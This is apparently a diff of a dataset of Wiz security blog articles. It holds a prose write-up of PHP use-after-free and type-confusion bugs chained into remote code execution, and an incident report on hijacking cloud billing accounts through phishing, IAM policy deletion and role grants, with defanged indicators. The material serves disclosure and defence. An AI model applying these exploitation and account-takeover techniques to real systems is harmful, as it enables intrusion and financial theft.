+Using Gemini 4 Argon, the team at Wiz has shown why frontier AI is a game-changer for cyber defense. For over a decade, these critical vulnerabilities remained unaddressed because vulnerability discovery and exploitation were incredibly complex. We're pleased to see Gemini 4 Argon help defenders bridge that gap, finding vulnerabilities and helping patch them.
+
+Raluca Ada Popa, Head of Gemini Security, Google DeepMind
+
+Industry-level collaborations
+
+Prior to public disclosure, Wiz Research worked with the PHP team, Calif and OpenAI on discovery, coordination and patch verification. We also partnered with Google Cloud, Cloudflare, AWS, Microsoft, Automattic, Fastly, Akamai, Imperva, Vercel and many others to prepare customer guidance, detections and out-of-the-box mitigations for organizations that cannot update immediately.
+
+A vulnerability in core PHP reaches far beyond a single application. PHP runs across clouds, hosting providers, content-delivery networks and millions of independently managed servers. Reducing exposure before the technical details became public required coordinated work across that entire ecosystem.
+
+Technical deep dive
+
+Bug: Upload-progress unserializer use-after-free
+
+PHP's Session module can decode session data during upload-progress handling in the same pre-initialization window. The decoder stores request-owned bookkeeping in BG(unserialize). A fatal allocation failure can interrupt this path, destroy the request heap and leave the unserializer's global state published.
+
+On a later request handled by the same worker, PHP can consume attacker-reclaimed memory as live unserializer bookkeeping. The stale state becomes a powerful memory-corruption primitive. We combined it with the memory disclosure to remove address uncertainty and achieved unauthenticated remote code execution on WordPress, Drupal and Joomla.
+
+The WordPress, Drupal and Joomla chains are representative demonstrations. The underlying primitives exist at the PHP engine level and can affect any PHP application running on a vulnerable version.
+
+These issues execute below the application layer, so application logs may contain little context. Until systems are patched, defenders should pay particular attention to unusual multipart requests followed by memory-limit errors or repeated HTTP 500 responses, unexpectedly large or malformed PHPSESSID response cookies, and unexplained PHP worker churn. These signals can guide an investigation. Applying the PHP security update remains the only complete remediation.
+
+Bug: Remote process-memory disclosure
+
+PHP parses RFC1867 multipart requests during request startup, before normal module initialization has completed. Session upload-progress handling can initialize Session state at this early stage and publish a session ID in PS(id). An out-of-memory error can abort the request before cleanup completes. PHP then destroys the request heap and may leave PS(id) pointing to the freed allocation.
+
+A later multipart request handled by the same worker can reach the upload-progress cleanup path before normal Session initialization resets that pointer. PHP trusts the stale pointer and length as a live zend_string and URL-encodes the reclaimed heap contents into a PHPSESSID response cookie. The attack works even when the application never calls session_start(), making the issue application-agnostic. We demonstrated unauthenticated disclosure of an attacker-sized region of live worker memory containing data from outside the attacker's request.
+
+Bug: Fatal-error backtrace use-after-free
+
+In affected versions, PHP retains the backtrace of the most recent fatal error in EG(last_fatal_error_backtrace). A fatal out-of-memory error can destroy the request heap without undefining that executor-global value. The worker survives with a global that still points to memory from the previous request.
+
+If the same worker emits a diagnostic early in the next request, it can access the pointer before the executor reinitializes that state. PHP then destroys or updates the dangling backtrace and follows attacker-reclaimed memory. The resulting cross-request use-after-free can be developed into controlled memory corruption. We demonstrated unauthenticated remote code execution against Drupal using this primitive.
+
+Bug: OPcache type confusion
+
+OPcache persists compiled PHP structures in shared memory and assigns indices into per-worker runtime-pointer maps. Workers coordinate those indices through a shared frontier. During zend_accel_script_persist(), PHP advances the process-local CG(map_ptr_last) frontier. It publishes the corresponding shared frontier only after persistence completes. An allocation failure between those two events leaves the process-local advance in place and partially persisted objects referring to slots that the shared state still considers available.
+
+When another worker later reuses one of those slots for a different runtime object, stale shared metadata resolves to a pointer of the wrong type. The mismatch creates a cross-worker type confusion and corrupts shared OPcache state. We used this primitive to build an unauthenticated RCE chain against WordPress.
+
+There are other variants outside of these four bugs. While we initially reported these four to PHP, through this research we realized the vulnerability is deeply rooted in the PHP codebase and will require a comprehensive fix. Other variants should also fold under the same two CVEs.
+
+How Can Wiz Help?
+
+Wiz customers should refer to the Wiz Threat Intel Center advisory for PHP2Shell, which includes built-in coverage for agentless and runtime vulnerability detection, exploitation detection via Wiz Defend and Sensor, and automatic response policies, alongside remediation and threat hunting guidance.
+
+Sensor customers using the newest version (1.0.12768) can also enable a built-in response policy to automatically terminate processes exhibiting behaviors typical of PHP2Shell exploitation:
+
+Conclusion
+
+With 70% of the Internet affected, the impact of PHP2Shell cannot be overstated. It marks an AI inflection point. The vulnerable code had been there for more than a decade – what AI changed was the ability to understand the weaknesses and turn them into a working exploit. With frontier AI models and the right tools, a single researcher completed in a week what previously would have taken a world-class team months of work.
+
+This changes the economics of both discovery and exploitation. Vulnerabilities that once seemed impractical to exploit become viable targets. These same capabilities also give defenders a chance to uncover and fix flaws that have survived years of scrutiny.
+
+Wiz used Wiz Atlas, Gemini 4 Argon, and GPT-5.6 Sol throughout this research, with Argon making a particularly significant contribution to finding and helping to remediate the vulnerability.
+
+The opportunity is to make this work routine: systematically finding flaws in existing software and catching new ones before they reach production. Our coordinated efforts with PHP, OpenAI and Calif advance that goal, applying AI to strengthen the software foundations we all share.
+
+Responsible disclosure timeline
+
+August 19, 2026: Wiz Research discovers the first PHP vulnerability using Wiz Atlas, Gemini 4 Argon, and GPT-5.6 Sol.
+
+August 20, 2026: Unauthenticated RCE is confirmed against Drupal.
+
+August 21, 2026: Unauthenticated RCE is confirmed against WordPress.
+
+August 24, 2026: Wiz Research reports the vulnerabilities to the PHP security team.
+
+September 21, 2026: PHP acknowledges the reports and begins developing a coordinated fix.
+
+October 21, 2026: Patched PHP releases become available.
+
+October 21, 2026: Public disclosure.
+
+Stay in touch
+
+Hi there! We are Sagi Tzadik, Shir Tamari, Nir Ohfeld and Tomer Schwartz from the Wiz Research Team (@wiz_io). We are a group of veteran white-hat hackers with a single goal: to make the cloud a safer place for everyone. We focus on finding new attack vectors in cloud software and uncovering isolation issues in the systems organizations depend on. We would love to hear from you on X or at research@wiz.io.
+
+Watch the Threat Briefing Webinar"
 f930d079f3dd,c46a80b17e3c,2026-10-21 13:44 UTC,"Attacks, Breaches & Threat Intel",Wiz,Wiz Blog,Identity Security Posture Management; Code Security; Endpoint Security; AI Security,Article,"LiteLLM Compromised, Steals Credentials",https://www.wiz.io/blog/litellm-compromised-steals-credentials,"We have not yet confirmed how the attacker gained access to our internal deployment, but currently suspect it was through a recently patched vulnerability","LiteLLM Compromised
 
 At 11:39 UTC on October 21, a malicious version (1.107.0) of the LiteLLM package was uploaded to PyPI. This version was quarantined on PyPI as of 13:20 UTC. According to ClickPy data, the malicious version received approximately 49,000 downloads.
@@ -1911,6 +2366,201 @@ Get Started Today
 Security should enable cloud innovation, not slow it down. By integrating eBPF runtime threat detection directly into GKE as a managed platform add-on, Google Cloud and Wiz have eliminated traditional deployment complexity.
 
 Explore the Google Cloud GKE Documentation and Wiz Documentation (login required) to enable the Wiz Sensor add-on on your clusters today."
+c4bbcf2b5dce,c4bbcf2b5dce,2026-10-20 20:03 UTC,"Attacks, Breaches & Threat Intel",Wiz,Wiz Blog,Threat Intelligence; AI Security; Email and Collaboration Security; Identity Security Posture Management,Article,From Phishing to LLMjacking: Threat Actors Targeting Cloud Billing Accounts for LLM Usage,https://www.wiz.io/blog/from-phishing-to-llmjacking,"Threat actors are not only using AI as a tool to conduct attacks, they are also compromising victim environments solely to abuse their finances for mass Large Language Model...","The Wiz Customer Incident Response Team (CIRT) has investigated a rising threat pattern in cloud environments: threat actors hijacking cloud billing accounts to fund unauthorized AI usage. Threat actors are not only using AI as a tool to conduct attacks, they are also compromising victim environments solely to abuse their finances for mass Large Language Model (LLM) execution, incurring hundreds of thousands of dollars in AI API charges.
+
+Wiz CIRT has investigated multiple intrusions demonstrating this pattern, with this blogpost focusing specifically on campaigns targeting Google Cloud Platform (GCP) infrastructure. In these attacks, threat actors compromised privileged GCP user credentials and linked external, attacker-controlled GCP projects directly to the victim's internal billing accounts. Because the AI workloads were processed in foreign projects, prompt contents and model outputs remained completely hidden from the victim organization, leaving the nature of the mass AI usage unknown.
+
+This blogpost details the full attack lifecycle observed across these intrusions, from the initial phishing and policy manipulation to cross-tenant project linking, and provides actionable threat hunting guidance to help organizations detect LLMjacking in their environments.
+
+Initial Access: Phishing via Sponsored Search Ads
+
+The attack began with a classic yet efficient phishing tactic. The threat actor purchased Google Search ads for common administrative search terms such as “google cloud” and “gcp”. When a user clicked the malicious ad, they were led through a Google Sites redirect to a fake Google login web page. Victim users with valid access to Google Console proceeded to input their account credentials and multi-factor-authentication (MFA) codes into the phishing page. The malicious site captured the user supplied credentials before seamlessly redirecting the user back to the legitimate Google authentication prompt. Forced to authenticate a second time, the user likely assumed the initial attempt was a minor glitch. In reality, the automated phishing kit immediately leveraged the harvested credentials to execute the first malicious login into the victim’s GCP environment from 212.73.134[.]136, the source IP address of the phishing kit. The threat actor then reauthenticated a few minutes later from a second IP address, which was later used for the rest of the GCP activity. Following reports of this activity, Google Ads has taken action to remove the malicious ad campaign.
+
+Google automatically flagged the anomalous login attempt as suspicious and dispatched security alert emails to the user's inbox. However, to catch such intrusions early, organizations should not rely on user awareness alone, but ingest and monitor Google Workspace User Log Events for suspicious login flags and anomalous re-authentication triggers.
+
+Persistence and Privilege Escalation: Disabling Guardrails and Externalizing Billing
+
+Once inside the environment, the threat actor leveraged the compromised account’s excessive privileges to solidify their access, bypass organizational security controls, and prepare the billing architecture for external exploitation.
+
+Enabling APIs and Minting Service Account Credentials
+
+Rather than creating new infrastructure from scratch, the attacker targeted existing, low-usage GCP projects to:
+
+Enable the Gemini API product
+
+Create service accounts with Gemini API keys
+
+Add the newly created service accounts to high privileged roles such as roles/ml.admin and roles/mcp.toolUser
+
+Dismantling Organizational Policy Controls
+
+To expand their reach without raising immediate alarms within internal domain governance, the threat actor deleted safety policies at the organization level, such as iam.allowedPolicyMemberDomains. This action removed the guardrail that restricts Identity and Access Management (IAM) membership to verified company domains, enabling external, personal accounts to be granted access as well as high-privilege permissions.
+
+Inviting External Threat Actor Accounts and Elevating Privileges
+
+With domain restrictions lifted, the compromised user account was leveraged to add external actor-controlled Gmail accounts directly into the organization's billing account.
+
+The threat actor also assigned administrative roles to the compromised users or the external accounts, such as:
+
+roles/recommender.billingAccountCudAdmin on GCP projects
+
+roles/billing.admin on GCP billing accounts
+
+The role roles/billing.admin granted full control over the billing account, including the ability to manage permissions, attach external projects, and alter payment settings.
+
+Linking Foreign Projects for Mass Exploitation
+
+The threat actor linked external GCP projects directly to the victim’s internal billing account. This move established a cross-tenant access, allowing all API requests executed in the threat actors external projects to be automatically charged to the victim's billing account while keeping prompt payloads invisible to internal log monitoring.
+
+Defence Evasion: Geographic Blending and Admin Lockout
+
+Once initial access was secured, threat actors employed defense evasion techniques designed to avoid triggering location-based security alerts and prevent security teams from regaining control.
+
+In each of the intrusions investigated, Wiz CIRT observed that after the initial login, subsequent threat actor activity shifted to originate from IP addresses geolocated within each victim organization's headquartered country, even when this did not match the compromised user’s actual physical location.
+
+Additionally, after securing administrative control, the threat actors demoted pre-existing internal billing administrators from their administrative roles down to read-only billing viewers. This modification stripped legitimate administrators of their ability to revoke permissions or detach rogue projects directly from the console.
+
+Impact: AI Resource Abuse
+
+The primary objective of these intrusions was non-destructive financial exploitation - leveraging hijacked cloud infrastructure to offload the costs of high-volume LLM inference. Across the observed cases, the impact manifested as rapid billing surges driven by automated, large-scale Gemini API utilization.
+
+Within 24 to 48 hours of initial access, victim organizations experienced unexpected charges reaching tens to hundreds of thousands of dollars in unauthorized Gemini API usage. This activity represented a sharp surge from the organizations' established baseline compute spend.
+
+Because the threat actors linked external, attacker-controlled GCP projects directly to the victim’s billing accounts, all API key generation, prompt requests, and model outputs occurred entirely within foreign tenants. Consequently, while the victim organization carried financial responsibility for the API consumption, internal security and audit logs provided no visibility into the nature, content, or context of the AI workloads being executed.
+
+Detection and Threat Hunting Indicators
+
+To detect potential LLMjacking and unauthorized billing account manipulation in your Google Cloud environment, security teams should hunt for indicators across Google Workspace, GCP Admin Activity, and Cloud Billing audit logs. Wiz customers can review the Threat Intel Center advisory that includes the following indicators:
+
+Review Google Workspace and GCP audit logs for activity from the indicators of compromise section below. Wiz customers can use this Cloud Events query.
+
+Review GCP IAM for any users with external domains, especially non-corporate email providers such as @gmail.com. Wiz customers can use this Cloud Events query, and replace the domain.com with their own organization domain.
+
+Review GCP audit logs for changes to organization policy controls, especially allowedPolicyMemberDomains, and IAM policy changes related to billing account administrators. Wiz customers can use this Cloud Events query.
+
+Review GCP audit logs for unexpected Gemini API enablement, service account creation and service account API key creation in old projects Wiz customers can use this Cloud Events query.
+
+Monitor abnormal cost surge in API usage, and potentially enforce spend cap budgets. Wiz Cloud Cost customers can detect abnormal AI usage per model and cloud provider by monitoring Cost Monitor Findings for Resource Anomalies.
+
+Wiz Defend customers ingesting cloud logs such as Google Workspace will get Wiz Threats on the initial logins. Customers ingesting GCP audit logs will get Threats for the described activity.
+
+If you experience a breach or any cloud security incident, contact Wiz CIRT for incident response support.
+
+Indicators of Compromise
+
+IOC
+
+Type
+
+Description
+
+212.73.134[.]136
+
+IP Address
+
+Attacker infrastructure - IP seen in the initial login from the phishing page
+
+*.gboogl[.]com
+
+Domain
+
+Attacker infrastructure - phishing domain
+
+*.groosl[.]com
+
+Domain
+
+Attacker infrastructure - phishing domain
+
+*.gprokl[.]com
+
+Domain
+
+Attacker infrastructure - phishing domain
+
+*.gxoosl[.]com
+
+Domain
+
+Attacker infrastructure - phishing domain
+
+*.gsoolg[.]com
+
+Domain
+
+Attacker infrastructure - phishing domain
+
+*.gwoogl[.]com
+
+Domain
+
+Attacker infrastructure - phishing domain
+
+*gzoozl[.]com
+
+Domain
+
+Attacker infrastructure - phishing domain
+
+*groonl[.]com
+
+Domain
+
+Attacker infrastructure - phishing domain
+
+*gsool[.]space
+
+Domain
+
+Attacker infrastructure - phishing domain
+
+*gbrokl[.]space
+
+Domain
+
+Attacker infrastructure - phishing domain
+
+*gbrokl[.]xyz
+
+Domain
+
+Attacker infrastructure - phishing domain
+
+*gsoosl[.]xyz
+
+Domain
+
+Attacker infrastructure - phishing domain
+
+*gsool[.]xyz
+
+Domain
+
+Attacker infrastructure - phishing domain
+
+*gpoosl[.]com
+
+Domain
+
+Attacker infrastructure - phishing domain
+
+*groolg[.]com
+
+Domain
+
+Attacker infrastructure - phishing domain
+
+*gcslom[.]com
+
+Domain
+
+Attacker infrastructure - phishing domain
+
+*gcoalg[.]com
+
+Domain
+
+Attacker infrastructure - phishing domain"
 2ee025de69a2,2ee025de69a2,2026-10-19 14:39 UTC,Vulnerabilities & Patching,Wiz,Wiz Blog,Code Security; Threat Intelligence; Vulnerability Management,Article,Supply Chain Zero Days: Closing the Gap Between Publication and Detection,https://www.wiz.io/blog/detect-supply-chain-zero-days-at-publication,"By analyzing new npm package versions as they are published and distributing confirmed threat intelligence across the platform, Wiz helps teams identify compromised packages...","Modern software development depends on open source packages. Developers and AI coding agents can pull new dependencies and versions into projects at speed, helping teams build and ship faster.
 
 But that speed creates a challenge for security teams. When a trusted package is compromised, malicious code can enter development environments and build pipelines before traditional vulnerability databases flag the threat.
